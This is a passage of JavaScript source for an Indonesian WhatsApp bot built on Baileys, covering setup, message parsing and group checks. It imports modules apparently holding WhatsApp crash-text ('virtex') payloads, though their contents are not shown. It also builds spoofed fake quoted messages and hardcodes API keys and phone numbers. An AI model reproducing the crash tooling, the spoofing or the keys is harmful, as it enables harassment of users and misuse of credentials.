//sc nya nih tnhkss udah pake
//update fitur lagi tampilan tanpa ence encean
const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ReclientectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const { virtex, vipi } = require("./lib/virtex.js"); 
const { Toxic } = require('./lib/Toxic.js')
const hx = require("hxz-api");
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const speed = require("performance-now");
const request = require("request");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const axios = require("axios");
const ffmpeg = require("fluent-ffmpeg");
const { EmojiAPI } = require("emoji-api");
const ig = require("insta-fetcher");
const emoji = new EmojiAPI();
const fetch = require("node-fetch");
const FormData = require("form-data");
const phoneNum = require("awesome-phonenumber");
const gis = require("g-i-s");
const got = require("got");
const imageToBase64 = require("image-to-base64");
const ID3Writer = require("browser-id3-writer");
const crypto = require('crypto')
const googleImage = require('g-i-s')
const brainly = require("brainly-scraper");
const xa = require('xfarr-api');
const yts = require("yt-search");
const ms = require("parse-ms");
const os = require('os');
const toMs = require("ms");
const imgbb = require("imgbb-uploader");
const { error } = require("qrcode-terminal");
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
} = require("./lib/functions");
const { color, bgcolor } = require("./lib/color");
const { virtex90 } = require('./virtex/virtex90')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { menunya } = require('./database/menu')
const { wikiSearch } = require('./lib/wiki.js')
const { mediafireDl } = require('./lib/mediafire.js')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { fetchJson, getBase64, kyun, createExif } = require("./lib/fetcher");
const { yta, ytv, igdl, upload, formatDate } = require("./lib/ytdl");
const { webp2mp4File } = require("./lib/webp2mp4");
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const afk = JSON.parse(fs.readFileSync("./lib/off.json"));
const { sleep, isAfk, cekafk, addafk } = require("./lib/offline");
const { cmdadd } = require("./lib/totalcmd.js");
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage');
const { addVote, delVote } = require("./lib/vote");
const reminder = require("./lib/reminder");
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const bucinrandom = JSON.parse(fs.readFileSync('./database/bucin.json'))
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let register = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let fakeimage = fs.readFileSync("./stik/thumb.jpeg")
let fakethumb = fs.readFileSync('./media/donasi.jpg')
const truth = JSON.parse(fs.readFileSync('./database/truth.json'))
const dare = JSON.parse(fs.readFileSync('./database/dare.json'))
virgam = fs.readFileSync(`./stik/virgam.jpeg`)
fakethumb = fs.readFileSync('./media/donasi.jpg')
fakeimage = fs.readFileSync("./stik/thumb.jpeg")
fakegim = fs.readFileSync('./media/donasi.jpg')
fakedown = fs.readFileSync('./media/download.jpg')
fakeker = fs.readFileSync('./media/kerang.jpg')
fakebil = fs.readFileSync('./media/baileys.jpg')
fakele = fs.readFileSync('./media/about.jpg')
fakelol = fs.readFileSync('./media/grup.jpg')
fakeown = fs.readFileSync('./media/own.jpg')
fakewibu = fs.readFileSync('./media/wibu.jpg')
fakeup = fs.readFileSync('./media/up.jpg')
fakemenu = fs.readFileSync('./media/menuall.jpg')
fakeote = fs.readFileSync('./media/other.jpg')
fakemeki = fs.readFileSync('./media/maker.jpg')
fakejem = fs.readFileSync('./media/tol.jpg')
fakepeler = fs.readFileSync('./media/tolol.jpg')
fakedatabase = fs.readFileSync('./media/data.jpg')
fakeoxy = fs.readFileSync('./media/oxiy.jpg')
fakegeming = fs.readFileSync('./media/game.jpg')
// GAME
let tebakanime = JSON.parse(fs.readFileSync('./database/tebakanime.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))
let caklontong = JSON.parse(fs.readFileSync('./database/caklontong.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/tebaksiapaaku.json'))
let tebakbendera = JSON.parse(fs.readFileSync('./database/tebakbendera.json'))
let susunkata = JSON.parse(fs.readFileSync('./database/susunkata.json'))
let tebakata = JSON.parse(fs.readFileSync('./database/tebakata.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./database/tebaklirik.json'))
let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))
let tebakimia = JSON.parse(fs.readFileSync('./database/tebakimia.json'))
let kuismath = JSON.parse(fs.readFileSync('./database/kuismath.json'))
let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))
let tebaktebakan = JSON.parse(fs.readFileSync('./database/tebaktebakan.json'))
let family100 = [];
// BATAS IMAGE FOLDER //
const iye = fs.readFileSync('./stik/thumb.jpeg')
const asw1 = 'https://f.top4top.io/p_2073p4mwa0.jpg'
const sip = fs.readFileSync('./stik/oksip.jpeg')
const bgg = fs.readFileSync('./stik/fake.jpeg')
//// Image ///
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat Dini Hari";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat Malam";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat Sore";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat Sore";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat Siang";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat Pagi";
    }
 // BATAS \\
menusimpel = false
menuall = false
banChats = false;
offline = false;
antidel = false;
welcom = false;
antical = false
readGc = true; 
readPc = false;
autovn = true;
multi = true
harga = 0
matauang = 'USD'
nopref = false
numbernye = '0'
autoketik = false;
prefixStatus = true;
waktuafk = 'Nothing'
alasanafk = 'Nothing'
targetpc = "disini isi no lo kontol jan no gue ngtod"; 
owner = "62858157008613"; 
fakeyoi = "ItsmeeAlya︎"; 
apisenku = 'SenkuApi', //Unlimited
HunterApi = "itsmevall69", //Unlimited
xchillds = 'XChillDs' //Unlimited
hardi = 'hardianto',  //Unlimited
valkey = "rivalgans", 
zeksapi = "vallganz5",
dapapi = "anakasu", //Unlimited
ApiZeks = "https://api.zeks.xyz",
zeksApikey = "Alphabott", //Unlimited
lolkey = "AlyaBot",  //120 limit
zerokey = "isi apikey lo / Beli kontol",
zekskey = "chika-key", //Unlimited
nomorowner1 = "@62858157008613"; 
fake = `DEVLOPED BY: ${fakeyoi}\nINCLUDES: ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」`;
thumb = fs.readFileSync("./stik/thumb.jpeg"); 
numbernye = "0"; 
waktu = "-";
alasan = "-"; 
autojoin = false;
cmhit = []
hit_today = [];
//===============//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));

// 𝗙𝘂𝗻𝗰𝗮𝘁𝗶𝗼𝗻 𝗦𝘁𝗶𝗰𝗸𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 シ︎
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};
const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
function monospace(string) {
return '```' + string + '```'
}   
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
module.exports = ALIYABOT = async (ALIYABOT, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
const typei = Object.keys(mek.message)[0]
const type = Object.keys(mek.message)[0]
let _chats =
      type === "conversation" && mek.message.conversation
        ? mek.message.conversation
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" && mek.message.extendedTextMessage.text
        ? mek.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId
        ? mek.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(mek.message[type].fileSha256.toString("base64"))
        : "";
const isImage = (type === 'imageMessage')
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      contactsArray,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
    const q = args.join(" ");
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
    const botNumber = ALIYABOT.user.jid;
    
    const botNumberss = ALIYABOT.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");

    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
    const bancht = JSON.parse(fs.readFileSync('./database/banchat.json'));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isNsfw = isGroup ? nsfww.includes(from) : false
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙂𝙘
var ampun = await ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await ALIYABOT.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙋𝙘
var chatss = await ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await ALIYABOT.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙑𝙣:𝙫
if (autovn) {
	if (autovn === false) return
await ALIYABOT.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await ALIYABOT.updatePresence(from, Presence.composing)
}
const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }        
    const sender = mek.key.fromMe
      ? ALIYABOT.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    let senderr = mek.key.fromMe
      ? ALIYABOT.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
    const totalchat = await ALIYABOT.chats.all();
    const ownerNumber = [`62858157008613,6281252848955@s.whatsapp.net`]
	const senderNumber = sender.split("@")[0] 
    const m = simple.smsg(ALIYABOT, mek);
    const groupMetadata = isGroup ? await ALIYABOT.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const itsMe = mek.key.fromMe ? true : false
    const isRegistered = checkRegisteredUser(sender)
   const isRegister = register.includes(sender)
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const isOwner = ownerNumber.includes(sender)
    const isBanned = ban.includes(sender)
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const hour_now = moment().format('HH:mm:ss')    
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isBanchat = isGroup ? bancht.includes(from) : false
    const isVote = isGroup ? voting.includes(from) : false;
    const conts = mek.key.fromMe
      ? ALIYABOT.user.jid
      : ALIYABOT.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe
      ? ALIYABOT.user.name
      : conts.notify || conts.vname || conts.name || "-";
    const readmore = "͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏";
    if (prefix && command) cmdadd();
    const totalhit = JSON.parse(fs.readFileSync("./lib/totalcmd.json"))[0]
      .totalcmd;      
		try {
		pporang = await ALIYABOT.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const ofrply = await getBuffer(pporang)
		const sekarang = new Date().getTime();
		//F
const daftar1 = `*Hi ${pushname}* 👋\n*Please Verify First*`
const daftar2 = '_Click the button to verify_'
const daftar3 = [{buttonId: `verify`,buttonText: {displayText: `💫VERIFY💫`,},type: 1,},]

var hayuk0 = '[NOT VERIFIED]'
			if (isRegistered) {
			hayuk0 = '[√ VERIFIED]'
			}
    //Y
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let locale = "id";
    let d = new Date();
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
cmhit.push(command)
    //MESS
    mess = {
      wait: "*Wait your request is being processed*",
      success: "Success︎",
      ban: "Kamu Telah Di Ban Oleh Owner, silahkan chat owner untuk minta di unban",
      wrongFormat: "Wrong format, try again in the menu",
      error: {
        stick: "not that sticker:v",
        apiz: "Jan's writing stands for Error",
        Iv: "The link is error:v",
      },
      only: {
        group: "Only Admin",
      },
    };

    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };
  /*const reply = (teks) => {    

      ALIYABOT.sendMessage(from, teks, text, { quoted: mek });
    };*/
    const textImg = (teks) => {
           return ALIYABOT.sendMessage(from, teks, text, {quoted: freply, thumbnail: fs.readFileSync('./alya.jpg')})
        }
const math = (teks) => {
           return Math.floor(teks)
       }
/*const reply = (teks) => {
			ALIYABOT.sendMessage(from, teks, text, { thumbnail: iye, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/62858157008612?text=Assalamualaikum`}}})
		}*/
    const sendMess = (hehe, teks) => {
      ALIYABOT.sendMessage(hehe, teks, text);
    };

    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? ALIYABOT.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : ALIYABOT.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
    };   
// Fake Reply Bang:)
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "6289523258649-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: iye,
          surface: 200,
          message: iye,
          orderTitle: "ALIYABOT.",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./alya.jpg')
        }}}
const freply7 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '1595603042@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": iye, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
}
 const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 800000,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: iye, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const ftroli2 = {
	key : {
